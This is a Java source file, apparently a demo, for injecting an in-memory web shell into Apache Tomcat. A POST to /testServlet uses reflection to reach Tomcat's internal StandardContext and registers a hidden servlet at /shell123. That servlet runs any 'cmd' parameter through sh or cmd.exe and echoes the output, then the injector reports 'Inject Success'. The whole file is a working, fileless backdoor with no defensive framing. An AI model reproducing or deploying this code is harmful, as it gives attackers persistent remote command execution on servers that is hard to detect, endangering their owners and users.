package com.example.tomcatmemshelldemo;

import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Scanner;

@WebServlet("/testServlet")
public class TestServlet extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        final String name = "servletshell";
        // 获取上下文
        ServletContext servletContext = request.getSession().getServletContext();

        Field appctx = null;
        try {
            appctx = servletContext.getClass().getDeclaredField("context");

            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            Servlet servlet = new Servlet() {
                @Override
                public void init(ServletConfig servletConfig) throws ServletException {

                }
                @Override
                public ServletConfig getServletConfig() {
                    return null;
                }
                @Override
                public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
                    if (servletRequest.getParameter("cmd") != null) {
                        String cmd = servletRequest.getParameter("cmd");
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\A");
                        String output = s.hasNext() ? s.next() : "";
                        PrintWriter out = servletResponse.getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                    }
                }

                @Override
                public String getServletInfo() {
                    return null;
                }
                @Override
                public void destroy() {

                }
            };

            org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
            newWrapper.setName(name);
            newWrapper.setLoadOnStartup(1);
            newWrapper.setServlet(servlet);
            newWrapper.setServletClass(servlet.getClass().getName());

            standardContext.addChild(newWrapper);
            standardContext.addServletMappingDecoded("/shell123",name);
            response.getWriter().write("Inject Success");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
